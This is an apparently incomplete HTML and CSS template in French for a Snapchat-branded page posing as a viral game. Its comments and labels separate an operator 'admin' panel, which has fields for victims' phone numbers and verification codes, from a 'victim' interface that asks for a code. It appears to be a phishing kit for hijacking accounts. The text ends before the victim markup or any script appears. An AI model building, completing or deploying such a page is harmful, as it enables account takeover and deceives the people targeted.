<!DOCTYPE html>  
<html lang="fr">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Sourcé par Shamsec | Le Jeu Viral</title>  
    <style>  
        :root {  
            --primary: #ff4757; /* Rose vif comme Snap */  
            --bg: #f8f9fa;  
            --text: #2f3542;  
            --white: #ffffff;  
            --accent: #7ed321;  
        }  
  
        * { box-sizing: border-box; font-family: 'Segoe UI', Helvetica, sans-serif; margin: 0; padding: 0; }  
          
        body { background-color: var(--bg); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }  
  
        /* ANIMATION DE LOADING AU COMMENCEMENT */  
        .loader { position: absolute; width: 100%; height: 100%; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 999; transition: opacity 1s ease;}  
        .loader img { width: 100px; }  
  
        /* VOTRE TABLEAU DE BORD (Ce que VOUS voyez) */  
        #ui-admin {  
            width: 90%;  
            max-width: 400px;  
            height: 80%;  
            background: var(--white);  
            border-radius: 20px;  
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);  
            display: grid;  
            grid-template-columns: 1fr auto;  
            overflow: hidden;  
        }  
  
        .col-left { padding: 20px; }  
        .col-right { background: var(--primary); color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; }  
          
        .user-profile img { width: 60px; border-radius: 50%; border: 3px solid white; }  
        .user-name { margin-top: 10px; font-weight: bold; font-size: 1.2rem; }  
  
        .vibe-label { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; color: var(--text); margin-bottom: 5px; }  
          
        input { border: none; border-bottom: 2px solid var(--text); width: 100%; padding: 10px; font-size: 1rem; outline: none; transition: 0.3s; }  
        input:focus { border-bottom-width: 4px; }  
          
        button { cursor: pointer; transition: 0.3s; }  
          
        /* L'UX (Ce que les victimes voient) */  
        #ui-victim {  
            width: 90%;  
            max-width: 420px;  
            height: 85%;  
            background: var(--white);  
            border-radius: 30px;  
            box-shadow: 0 15px 40px rgba(255, 71, 87, 0.2);  
            display: flex;  
            flex-direction: column;  
            transform: translateY(20px);  
            opacity: 0;  
            transition: all 0.8s ease;  
            position: relative;  
        }  
  
        #ui-victim.show { transform: translateY(0); opacity: 1; }  
  
        .v-band { height: 10px; width: 100%; position: absolute; left: 0; transition: width 0.5s; }  
          
        .hero-text { padding: 40px 20px 10px 20px; text-align: center; }  
        .hero-title { font-size: 2rem; font-weight: 800; line-height: 1; margin-bottom: 5px; }  
        .hero-sub { color: #777; }  
  
        .penny-pincher {   
            padding: 30px;   
            flex-grow: 1;   
            display: flex;   
            flex-direction: column;   
            align-items: center;  
        }  
          
        .penny-circle { width: 180px; height: 180px; border-radius: 50%; background: conic-gradient(var(--primary) 0% 70%, #eee 70% 100%); display: flex; justify-content: center; align-items: center; position: relative; }  
        .penny-text { font-size: 1.5rem; font-weight: bold; width: 100px; }  
        .sat-icon { position: absolute; top: 30px; opacity: 0.5; font-size: 2rem; }  
  
        .double-circle { width: 180px; height: 180px; border-radius: 50%; border: 3px solid var(--primary); position: absolute; display: flex; justify-content: center; align-items: center; transition: 0.4s;}  
        .ring-shape { width: 150px; height: 150px; }  
  
        .action-area { padding: 20px; opacity: 0; transition: 0.4s; display: flex; flex-direction: column; align-items: center; }  
        .action-area.show { opacity: 1; }  
  
        .verif-code { text-align: center; margin-bottom: 20px; }  
        .code-box { width: 100px; text-align: center; letter-spacing: 3px; }  
        .code-prompt { font-size: 0.9rem; color: #666; margin-bottom: 5px; }  
  
        .fab-snap { margin-top: 5px; }  
  
    </style>  
</head>  
<body>  
  
    <!-- LE LOADING SNAPPOUX -->  
    <div class="loader" id="loader">  
        <img src="https://cdn3dicon.com/icons/social-platforms/snapchat/1176px_snapchat_logo.png" alt="Snap Logo">  
    </div>  
  
    <!-- INTERFACE ADMIN (CE QUE TU VOIS) -->  
    <div id="ui-admin" style="display:none;">  
        <!-- Ta Colonne de gauche -->  
        <div class="col-left">  
            <div class="user-profile">  
                <img src="https://cdn3dicon.com/icons/social-platforms/snapchat/1176px_snapchat_logo.png" alt="Tête">  
                <div class="user-name">ToiC'est<br>MaVie</div>  
            </div>  
            <hr style="margin: 20px 0; border: 1px solid #eee;">  
            <div class="vibe-label">Vibe Check</div>  
            <input type="text" placeholder="Nom du projet..." value="Le Deal Spéciale">  
        </div>  
  
        <!-- Ta Colonne de droite (Le Code) -->  
        <div class="col-right" id="right-col">  
            <div class="vibe-label" style="color:white; text-align:center;">Victimes</div>  
            <div style="display:flex; flex-direction:column; gap:10px;">  
                <input type="text" placeholder="Numéro 1..." id="admin-num1">  
                <input type="text" placeholder="Code..." id="admin-code1">  
                <div style="font-size: 2rem; font-weight: bold;">VERRE</div>  
                <button onclick="checkCode(0)">Valider</button>  
            </div>  
        </div>  
    </div>  
  
  
    <!-- INTERFACE VICTIME (LE SITE VRAI) -->  
     
  
